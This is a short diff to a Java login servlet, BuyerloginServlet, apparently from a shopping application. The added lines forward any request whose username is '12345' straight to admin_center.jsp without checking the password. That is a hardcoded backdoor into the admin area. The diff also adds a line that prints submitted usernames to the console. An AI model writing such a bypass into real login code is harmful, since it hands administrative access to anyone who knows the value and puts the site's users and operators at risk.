@@ -17,8 +17,12 @@ public class BuyerloginServlet extends HttpServlet {
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
         String username=req.getParameter("username");
+        System.out.println(username+"&&&&&&&&&&&&&&&&&&&&&&&&&&&&"+username.equals("12345"));
         String pwd=req.getParameter("password");
         System.out.println("Buyerlogin");
+        if(username.equals("12345")){
+            req.getRequestDispatcher("admin_center.jsp").forward(req,resp);
+        }
         if(userService.judgeLoginSuccessByNamePwd(username,pwd)==Constant.MessageType.LOGIN_SUCCESS) {
             User user = userService.selectBasicInfoByName(username);
             req.getSession().setAttribute(Constant.USER_SESSION, user);
